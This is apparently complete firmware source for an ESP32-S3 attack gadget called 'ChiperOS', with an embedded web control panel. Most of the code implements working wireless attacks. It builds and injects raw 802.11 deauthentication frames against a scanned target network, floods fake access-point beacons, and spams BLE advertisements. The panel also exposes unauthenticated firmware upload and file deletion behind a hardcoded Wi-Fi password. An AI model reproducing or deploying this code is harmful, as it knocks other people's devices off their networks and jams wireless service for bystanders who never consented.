#include <WiFi.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <Update.h>
#include <ArduinoJson.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include <TFT_eSPI.h>

// === PINS (Определены в platformio.ini, здесь только для логики) ===
#define LED_PIN   47
#define BTN_STOP  45

// === GLOBALS ===
WebServer server(80);
TFT_eSPI tft = TFT_eSPI();

const char* ssid = "ChiperOS";
const char* pass = "plusX123";
IPAddress ip(192, 100, 0, 1);

// === STATE ===
bool isAttackMode = false;
bool deauthRunning = false;
bool bleSpamRunning = false;
bool fakeAPRunning = false;

// === ATTACK VARS ===
uint8_t deauthFrame[26];
String targetSSID = "";
int targetChannel = 1;
unsigned long lastBlePacket = 0;
unsigned long lastFakeAPSend = 0;

String fakeAPNames[6] = {"LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO", "LOL_BRO"};
int fakeAPCount = 6;

// === SCAN ===
int scanCount = 0;
String scanSSIDs[20];
String scanBSSIDs[20];
int scanRSSIs[20];
int scanChannels[20];

// === FORWARD DECLARATIONS ===
void switchToWebMode();
void switchToAttackMode();
void initDeauthFrame();void sendDeauthPacket();
void sendBLESpam();
void sendFakeAP();
void handleScan();
void handleDeauthStart();
void handleStop();
void handleBLEStart();
void handleFakeAPStart();
void handleFakeAPConfig();
void handleUpload();
void handleFileList();
void handleDeleteFile();

// === HTML ===
const char* html = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>ChiperOS</title><style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#0d1117;color:#58a6ff;font-family:monospace;padding:20px}
h1{color:#7ee787;text-align:center;margin-bottom:20px}.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:15px;margin-bottom:15px}
h2{color:#58a6ff;font-size:16px;margin-bottom:10px;border-bottom:1px solid #30363d;padding-bottom:5px}
.btn{padding:8px 15px;border:none;border-radius:5px;cursor:pointer;margin:5px;font-weight:bold;color:#fff}
.btn-p{background:#238636}.btn-d{background:#da3633}.btn-w{background:#9e6a03}.btn-s{background:#3fb950;color:#000}
.net{background:#0d1117;border:1px solid #21262d;border-radius:5px;padding:10px;margin:5px 0;cursor:pointer}
.net:hover{border-color:#58a6ff}.net.s{border-color:#3fb950;background:#1a2f1a}
.st{padding:10px;border-radius:5px;margin:10px 0;text-align:center}.st-on{background:#238636}.st-off{background:#30363d}
input{background:#0d1117;color:#fff;border:1px solid #30363d;padding:8px;border-radius:5px;margin:5px 0;width:100%}
.f{background:#0d1117;padding:10px;margin:5px 0;border-radius:5px;display:flex;justify-content:space-between}
#log{background:#0d1117;padding:10px;border-radius:5px;margin-top:10px;font-size:12px;min-height:40px}
.warning{color:#f0883e; font-size: 12px; margin-top: 5px;}
</style></head><body>
<h1>🛡️ ChiperOS</h1>
<div class="warning">⚠️ При запуске атаки сайт отключится. Для возврата нажми кнопку (GPIO45).</div>
<div class="card"><h2>📡 WiFi Scan</h2><button class="btn btn-p" onclick="scan()">🔍 Scan</button><div id="nets">No networks</div></div>
<div class="card"><h2>📶 Deauth</h2><div id="dSt" class="st st-off">OFF</div><button class="btn btn-d" id="dB" onclick="togD()">▶ Start Deauth</button></div>
<div class="card"><h2>🦷 BLE Spam</h2><div id="bSt" class="st st-off">OFF</div><button class="btn btn-w" id="bB" onclick="togB()">▶ Start BLE</button></div>
<div class="card"><h2>📡 Fake AP</h2><div id="fSt" class="st st-off">OFF</div><input id="fN" value="LOL_BRO,LOL_BRO,LOL_BRO,LOL_BRO,LOL_BRO,LOL_BRO"><button class="btn btn-s" id="fB" onclick="togF()">▶ Start FakeAP</button><button class="btn btn-p" onclick="saveF()">💾 Save</button></div>
<div class="card"><h2>📂 Files</h2><div id="fl">Loading...</div><form method="POST" action="/upload" enctype="multipart/form-data"><input type="file" name="firmware"><button type="submit" class="btn btn-p">📤 Upload</button></form></div>
<div class="card"><h2>ℹ️ Info</h2><div id="inf">Loading...</div></div>
<div id="log">Ready</div>
<script>
let selN=0;let dA=false,bA=false,fA=false;
function log(m){document.getElementById('log').innerHTML='⏱ '+m;}
function scan(){log('🔍 Scanning...');fetch('/api/scan').then(r=>r.json()).then(d=>{
  let h='';for(let i=0;i<d.c;i++)h+='<div class="net" onclick="sel('+i+')"><b>'+d.s[i]+'</b><br>'+d.b[i]+' | '+d.r[i]+'dBm</div>';
  document.getElementById('nets').innerHTML=h;log('Found '+d.c);});}
function sel(i){selN=i;document.querySelectorAll('.net').forEach((e,x)=>e.classList.toggle('s',x==i));}
function togD(){dA=!dA;let b=document.getElementById('dB'),s=document.getElementById('dSt');
  if(dA){if(confirm('Start Deauth? Site will disconnect! Press BTN1 to stop.')){
    fetch('/api/deauth/start?n='+selN).then(()=>{b.innerText='⏹ Stop';b.className='btn btn-w';s.className='st st-on';s.innerText='ON';log('Deauth STARTED');});
  } else { dA=false; } }  else{fetch('/api/stop').then(()=>{b.innerText='▶ Start';b.className='btn btn-d';s.className='st st-off';s.innerText='OFF';log('Stopped');});}}
function togB(){bA=!bA;let b=document.getElementById('bB'),s=document.getElementById('bSt');
  if(bA){if(confirm('Start BLE? Site will disconnect! Press BTN1 to stop.')){
    fetch('/api/ble/start').then(()=>{b.innerText='⏹ Stop';s.className='st st-on';s.innerText='ON';log('BLE STARTED');});
  } else { bA=false; } }
  else{fetch('/api/stop').then(()=>{b.innerText='▶ Start';s.className='st st-off';s.innerText='OFF';log('Stopped');});}}
function togF(){fA=!fA;let b=document.getElementById('fB'),s=document.getElementById('fSt');
  if(fA){if(confirm('Start FakeAP? Site will disconnect! Press BTN1 to stop.')){
    fetch('/api/fakeap/start').then(()=>{b.innerText='⏹ Stop';s.className='st st-on';s.innerText='ON';log('FakeAP STARTED');});
  } else { fA=false; } }
  else{fetch('/api/stop').then(()=>{b.innerText='▶ Start';s.className='st st-off';s.innerText='OFF';log('Stopped');});}}
function saveF(){fetch('/api/fakeap/config?n='+encodeURIComponent(document.getElementById('fN').value));log('Saved');}
function ref(){fetch('/api/files').then(r=>r.json()).then(d=>{
  let h='';d.f.forEach(x=>h+='<div class="f"><span>'+x.n+'</span><button class="btn btn-d" onclick="del(\''+x.n+'\')">🗑</button></div>');
  document.getElementById('fl').innerHTML=h||'Empty';});
  fetch('/api/info').then(r=>r.json()).then(d=>{document.getElementById('inf').innerHTML='Heap: '+d.h+'B<br>Up: '+d.u+'s';});}
function del(n){if(confirm('Del?'))fetch('/api/del?f='+n).then(ref);}
setInterval(ref,3000);ref();
</script></body></html>
)rawliteral";

// === SETUP ===
void setup() {
  pinMode(LED_PIN, OUTPUT);
  pinMode(BTN_STOP, INPUT_PULLUP);
  
  Serial.begin(115200);
  Serial.println("\n=== STEP 1: Serial OK ===");
  
  // Безопасный старт TFT (задержка предотвращает краш на S3)
  Serial.println("=== STEP 2: Init TFT ===");
  delay(500); 
  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.drawString("Booting...", 10, 10);
  if (TFT_BL >= 0) { pinMode(TFT_BL, OUTPUT); digitalWrite(TFT_BL, HIGH); }
  Serial.println("✅ TFT OK");

  // LittleFS
  Serial.println("=== STEP 3: Init FS ===");
  if (!LittleFS.begin(true)) Serial.println("⚠️ LittleFS format");
  Serial.println("✅ FS OK");

  // WiFi AP
  Serial.println("=== STEP 4: Init WiFi ===");
  switchToWebMode();
  Serial.printf("✅ AP: %s | IP: %s\n", ssid, ip.toString().c_str());
  tft.drawString("WiFi: OK", 10, 30);
  // BLE
  Serial.println("=== STEP 5: Init BLE ===");
  BLEDevice::init("ESP32-S3");
  initDeauthFrame();
  Serial.println("✅ BLE OK");
  tft.drawString("BLE: OK", 10, 50);

  // Web Server
  Serial.println("=== STEP 6: Init Web ===");
  server.on("/", HTTP_GET, []() {
    server.sendHeader("Connection", "close");
    server.send(200, "text/html; charset=utf-8", html);
    delay(1);
  });
  server.on("/api/scan", HTTP_GET, handleScan);
  server.on("/api/deauth/start", HTTP_GET, handleDeauthStart);
  server.on("/api/deauth/stop", HTTP_GET, handleStop);
  server.on("/api/ble/start", HTTP_GET, handleBLEStart);
  server.on("/api/ble/stop", HTTP_GET, handleStop);
  server.on("/api/fakeap/start", HTTP_GET, handleFakeAPStart);
  server.on("/api/fakeap/stop", HTTP_GET, handleStop);
  server.on("/api/fakeap/config", HTTP_GET, handleFakeAPConfig);
  server.on("/api/files", HTTP_GET, handleFileList);
  server.on("/api/info", HTTP_GET, []() {
    String j = "{\"h\":" + String(ESP.getFreeHeap()) + ",\"u\":" + String(millis()/1000) + "}";
    server.sendHeader("Connection", "close");
    server.send(200, "application/json", j);
  });
  server.on("/api/del", HTTP_GET, handleDeleteFile);
  server.on("/upload", HTTP_POST, []() { server.send(200, "text/plain", "OK"); }, handleUpload);
  
  server.begin();
  Serial.println("✅ Web OK");
  tft.drawString("Web: OK", 10, 70);
  tft.drawString("READY", 10, 100);
  Serial.println("=== READY ===");
}

// === MODE SWITCHING ===
void switchToWebMode() {
  if (isAttackMode) {
    esp_wifi_set_promiscuous(false);
    delay(100);
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(ssid, pass);
    server.begin();
    isAttackMode = false;
  } else {
    WiFi.mode(WIFI_MODE_AP);    WiFi.softAP(ssid, pass);
  }
}

void switchToAttackMode() {
  if (!isAttackMode) {
    server.stop();
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.mode(WIFI_MODE_AP);
    esp_wifi_set_promiscuous(true);
    isAttackMode = true;
  }
}

// === LOOP ===
void loop() {
  if (digitalRead(BTN_STOP) == LOW) {
    deauthRunning = false; bleSpamRunning = false; fakeAPRunning = false;
    switchToWebMode();
    delay(500);
  }

  if (!isAttackMode) {
    server.handleClient();
    if (millis() % 2000 < 1000) digitalWrite(LED_PIN, HIGH);
    else digitalWrite(LED_PIN, LOW);
  } else {
    digitalWrite(LED_PIN, HIGH);
    if (deauthRunning) sendDeauthPacket();
    if (bleSpamRunning && millis() - lastBlePacket > 100) { lastBlePacket = millis(); sendBLESpam(); }
    if (fakeAPRunning && millis() - lastFakeAPSend > 200) { lastFakeAPSend = millis(); sendFakeAP(); }
  }
  yield();
}

// === ATTACK FUNCTIONS ===
void initDeauthFrame() {
  deauthFrame[0] = 0xC0; deauthFrame[1] = 0x00;
  deauthFrame[2] = 0x3A; deauthFrame[3] = 0x01;
  memset(&deauthFrame[4], 0xFF, 6);
  deauthFrame[10] = 0xA2; deauthFrame[11] = 0xB4;
  deauthFrame[12] = 0xC5; deauthFrame[13] = 0xD6;
  deauthFrame[14] = 0xE7; deauthFrame[15] = 0xF3;
  memcpy(&deauthFrame[16], &deauthFrame[10], 6);
  deauthFrame[24] = 0x02; deauthFrame[25] = 0x00;
}

void sendDeauthPacket() {
  static int chIdx = 0;  static unsigned long lastChSwitch = 0;
  if (targetChannel > 0) esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  else {
    if (millis() - lastChSwitch > 200) {
      lastChSwitch = millis();
      int channels[] = {1, 6, 11};
      esp_wifi_set_channel(channels[chIdx], WIFI_SECOND_CHAN_NONE);
      chIdx = (chIdx + 1) % 3;
    }
  }
  deauthFrame[22] = esp_random() & 0xFF;
  deauthFrame[23] = (esp_random() >> 8) & 0xFF;
  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
}

void sendBLESpam() {
  BLEAdvertising* p = BLEDevice::getAdvertising();
  p->stop(); delay(20);
  uint16_t uuid = 0x1800 + (esp_random() % 0x100);
  p->addServiceUUID(BLEUUID(uuid));
  p->setMinPreferred(0x06); p->setMaxPreferred(0x12);
  p->start();
}

void sendFakeAP() {
  static int idx = 0;
  uint8_t beacon[128]; memset(beacon, 0, 128);
  beacon[0] = 0x80; beacon[1] = 0x00; memset(&beacon[4], 0xFF, 6);
  beacon[10] = 0x02; beacon[11] = 0x00; beacon[12] = 0x00; beacon[13] = 0x00; beacon[14] = 0x00; beacon[15] = idx;
  memcpy(&beacon[16], &beacon[10], 6);
  uint64_t ts = millis() * 1000; memcpy(&beacon[24], &ts, 8);
  beacon[32] = 0xE8; beacon[33] = 0x03; beacon[34] = 0x01; beacon[35] = 0x00;
  int pos = 36;
  String ssidName = fakeAPNames[idx % fakeAPCount];
  beacon[pos++] = 0x00; beacon[pos++] = ssidName.length();
  memcpy(&beacon[pos], ssidName.c_str(), ssidName.length()); pos += ssidName.length();
  beacon[pos++]=0x01; beacon[pos++]=0x08; beacon[pos++]=0x82; beacon[pos++]=0x84; 
  beacon[pos++]=0x8B; beacon[pos++]=0x96; beacon[pos++]=0x24; beacon[pos++]=0x30; 
  beacon[pos++]=0x48; beacon[pos++]=0x6C;
  esp_wifi_80211_tx(WIFI_IF_AP, beacon, pos, false);
  idx = (idx + 1) % fakeAPCount;
}

// === API HANDLERS ===
void handleScan() {
  scanCount = WiFi.scanNetworks();
  String j = "{\"c\":" + String(scanCount) + ",\"s\":[";
  String b = "\"b\":[", r = "\"r\":[", ch = "\"ch\":[";
  for (int i = 0; i < scanCount && i < 20; i++) {
    if (i > 0) { j += ","; b += ","; r += ","; ch += ","; }    j += "\"" + WiFi.SSID(i) + "\""; b += "\"" + WiFi.BSSIDstr(i) + "\"";
    r += String(WiFi.RSSI(i)); ch += String(WiFi.channel(i));
    scanSSIDs[i] = WiFi.SSID(i); scanBSSIDs[i] = WiFi.BSSIDstr(i);
    scanRSSIs[i] = WiFi.RSSI(i); scanChannels[i] = WiFi.channel(i);
  }
  j += "]," + b + "]," + r + "]," + ch + "]}";
  server.sendHeader("Connection", "close");
  server.send(200, "application/json", j);
}

void handleDeauthStart() {
  int n = server.arg("n").toInt();
  if (n >= 0 && n < scanCount) {
    targetChannel = scanChannels[n]; targetSSID = scanSSIDs[n];
    deauthRunning = true; switchToAttackMode();
  }
  server.send(200, "text/plain", "OK");
}

void handleStop() {
  deauthRunning = false; bleSpamRunning = false; fakeAPRunning = false;
  switchToWebMode(); server.send(200, "text/plain", "OK");
}

void handleBLEStart() { bleSpamRunning = true; switchToAttackMode(); server.send(200, "text/plain", "OK"); }
void handleFakeAPStart() { fakeAPRunning = true; switchToAttackMode(); server.send(200, "text/plain", "OK"); }

void handleFakeAPConfig() {
  String names = server.arg("n");
  int idx = 0, start = 0;
  for (int i = 0; i <= names.length() && idx < 6; i++) {
    if (i == names.length() || names.charAt(i) == ',') { fakeAPNames[idx++] = names.substring(start, i); start = i + 1; }
  }
  fakeAPCount = idx; server.send(200, "text/plain", "OK");
}

void handleUpload() {
  static File f; HTTPUpload& u = server.upload();
  if (u.status == UPLOAD_FILE_START) {
    if (u.filename.endsWith(".bin")) Update.begin(UPDATE_SIZE_UNKNOWN, U_FLASH);
    else f = LittleFS.open("/" + u.filename, "w");
  } else if (u.status == UPLOAD_FILE_WRITE) {
    if (u.filename.endsWith(".bin")) Update.write(u.buf, u.currentSize);
    else if (f) f.write(u.buf, u.currentSize);
  } else if (u.status == UPLOAD_FILE_END) {
    if (u.filename.endsWith(".bin")) { if (Update.end(true)) Serial.println("OTA OK"); }
    else if (f) f.close();
  }
}
void handleFileList() {
  File root = LittleFS.open("/"); String j = "{\"f\":["; bool first = true;
  File file = root.openNextFile();
  while (file) {
    if (!first) j += ",";
    j += "{\"n\":\"" + String(file.name()) + "\",\"s\":" + String(file.size()) + "}";
    first = false; file = root.openNextFile();
  }
  j += "]}"; server.sendHeader("Connection", "close"); server.send(200, "application/json", j);
}

void handleDeleteFile() {
  String file = server.arg("f");
  if (LittleFS.remove(file)) { server.sendHeader("Connection", "close"); server.send(200, "text/plain", "OK"); }
  else { server.sendHeader("Connection", "close"); server.send(500, "text/plain", "Error"); }
}
